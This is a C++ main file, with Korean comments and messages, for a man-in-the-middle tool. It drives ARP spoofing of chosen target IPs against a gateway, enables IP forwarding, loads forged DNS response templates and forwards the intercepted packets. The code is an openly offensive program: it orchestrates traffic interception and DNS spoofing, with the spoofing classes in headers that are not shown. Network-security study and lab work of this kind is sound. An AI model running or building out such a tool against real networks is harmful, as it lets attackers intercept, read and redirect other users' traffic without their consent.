#include "network_utils.hpp"
#include "arp_spoof.hpp"
#include "dns_spoof.hpp"
#include "packet_forwarder.hpp"
#include <csignal>
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <atomic>

using namespace std;

atomic<bool> global_running(true);

void signal_handler(int signum) 
{
    if (signum == SIGINT) 
    {
        cout << "\n프로그램 종료 중...\n";
        global_running = false;
    }
}

int main(int argc, char* argv[]) 
{
    if (argc < 3) 
    {
        cerr << "사용법: " << argv[0] << " <인터페이스> <게이트웨이 IP> <대상 IP1> [대상 IP2 ...]\n";
        return 1;
    }
    
    string interface = argv[1];
    string gateway_ip = argv[2];
    
    // DNS 응답 템플릿 가져오기
    bool templates_loaded = initialize_dns_templates();
    if (!templates_loaded) 
    {
        cerr << "경고: 일부 DNS 템플릿을 로드하지 못했습니다. 동적 DNS 응답 생성을 시도합니다.\n";
    }
    
    ArpSpoofer::enable_ip_forwarding();
    signal(SIGINT, signal_handler);
    
    // ArpSpoofer 객체 생성 및 초기화
    ArpSpoofer* spoofer = new ArpSpoofer(interface);
    
    if (!spoofer->initialize()) 
    {
        delete spoofer;
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip))
    {
        delete spoofer;
        return 1;
    }
    for (int i = 3; i < argc; i++) 
    {
        string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            {
                cerr << "대상 추가 실패: " << target_ip << "\n";
            }
    }
    // 캡쳐필터 설정(지정된 host 만)
    spoofer->update_filter();
    spoofer->start_spoofing_all();
    
    // 패킷 포워딩 시작
    PacketForwarder forwarder(spoofer->get_handle(), spoofer);
    forwarder.start();
    
    // 현재는 프로세스 종료 명령어를 ctrl c로 진행중
    // 이후 stop command 입력으로 처리할 수 있도록 치환할 예정
    cout << "실행 중... \n";
    
    while (global_running)
        sleep(1);
    
    forwarder.stop();
    spoofer->stop_all();
    delete spoofer;
    ArpSpoofer::disable_ip_forwarding();
    
    cout << "프로그램이 정상적으로 종료되었습니다.\n";
    return 0;
}